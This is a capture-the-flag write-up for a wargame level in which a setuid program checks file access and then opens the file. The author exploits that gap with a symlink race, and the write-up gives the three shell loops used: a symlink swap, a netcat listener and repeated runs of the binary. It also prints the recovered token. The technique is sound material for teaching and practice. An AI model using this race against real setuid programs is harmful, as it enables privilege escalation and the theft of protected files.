# Level10

## Context
We found `level10` executable file and ```token``` file in our home.
```
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
```

Usage of level10:
```
./level10 file host
	sends file to host if you have access to it
```

We can make it work by launching these 2 commands in 2 seperate terminals:
```
nc -l 6969
```

```
./level10 file 0.0.0.0
```

Simple program explanation
 * ./level check with access if we have read rights to file (which we don't for `token`)
 * It then opens it (it can open `token`) and sends it to host

## Resolution
 * We use a symbolic link as file, which we constantly switch between `token` and a file we got access to.
 * We can do this by launching these 3 commands at the same in different terminals:
```sh
while true; do ln -sf /home/user/level10/token /var/crash/bg_du_75 && ln -sf /home/user/level10/level10 /var/crash/bg_du_75; done
```

```sh
while true; do nc -l 6969; done
```

```sh
while true; do ./level10 /var/crash/bg_du_75 0.0.0.0; done
```

 * We then get `woupa2yuojeeaaed06riuj63c` which can be use for flag10 AND flag11 !!!!
